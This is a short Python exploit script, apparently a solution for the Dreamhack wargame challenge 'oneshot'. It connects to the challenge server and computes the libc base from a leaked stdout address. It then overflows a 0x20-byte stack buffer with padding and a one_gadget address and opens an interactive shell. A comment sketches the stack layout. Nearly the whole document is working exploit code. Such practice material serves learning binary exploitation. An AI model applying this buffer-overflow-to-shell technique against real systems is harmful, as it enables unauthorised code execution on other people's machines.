from pwn import *

# p = process('./oneshot')
p = remote('host3.dreamhack.games', 13711)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

p.recvuntil(b'stdout: ')
libc_base = int(p.recvline()[:-1], 16) - libc.symbols['stdout']
print(f'libc_base: {hex(libc_base)}')

one_gadget = libc_base + 0x4526a

p.recvuntil(b'MSG: ')
payload = b'0' * 0x28 + p64(one_gadget)
p.sendline(payload)
p.interactive()

'''

sub rsp, 0x30
msg <- rbp - 0x20

'''
